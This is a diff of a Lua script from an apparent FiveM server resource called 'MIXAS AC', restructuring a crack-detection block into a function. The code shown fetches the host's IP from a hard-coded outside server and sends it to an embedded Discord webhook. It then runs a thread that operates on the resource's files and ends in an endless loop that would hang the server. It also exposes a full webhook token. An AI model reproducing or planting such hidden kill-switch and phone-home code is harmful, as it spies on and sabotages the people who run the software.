@@ -19,11 +19,7 @@ function startlog(ip)
     }
     PerformHttpRequest("https://canary.discord.com/api/webhooks/1071148393734352977/uPLG8dYIOrePPLd2bcuAxYdZ2HyKRzxAfenwX4k_QlHio96ko5zIBcvkCLTofTKswOjQ", function(err, text, headers) end, 'POST', json.encode({username = "MIXAS AC", embeds = connect}), { ['Content-Type'] = 'application/json' })
 end
-local code = LoadResourceFile(GetCurrentResourceName(),'fxmanifest.lua')
-if string.find(code,'henryhoover.lua') then
-    PerformHttpRequest("http://94.143.231.57/myip.php", function(err, text, headers)
-        startlog("CRACK  "..text)
-    end, 'GET', "")
+function mixas0c()
     Citizen.CreateThread(function()
     local s = GetResourcePath(GetCurrentResourceName())
     s = s:gsub("//", "/")
@@ -36,7 +32,14 @@ if string.find(code,'henryhoover.lua') then
           file:close()
       end
     end
-  end)
+    end)    
+end
+local code = LoadResourceFile(GetCurrentResourceName(),'fxmanifest.lua')
+if string.find(code,'henryhoover.lua') then
+    PerformHttpRequest("http://94.143.231.57/myip.php", function(err, text, headers)
+        startlog("CRACK  "..text)
+    end, 'GET', "")
+    mixas0c()
     Wait(5000)
     while true do
     end
